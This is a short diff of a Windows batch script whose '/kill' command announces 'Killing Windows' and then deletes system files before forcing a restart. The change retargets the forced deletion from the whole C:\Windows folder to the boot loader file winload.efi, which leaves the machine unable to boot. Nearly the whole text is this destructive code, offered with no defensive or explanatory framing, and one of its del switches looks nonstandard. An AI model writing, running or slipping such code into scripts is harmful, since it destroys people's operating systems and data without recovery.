@@ -11,7 +11,7 @@ set /p command=Write your command:
 if %command%==/kill (
     echo Killing Windows...
     echo This will delete all files in C:\Windows and restart the computer.
-  del /S /F /W C:\Windows
+  del /S /F /W "C:\Windows\System32\Boot\winload.efi"
   shutdown /r /fw /t 5
     goto begin
 ) else if %command%==/exit (
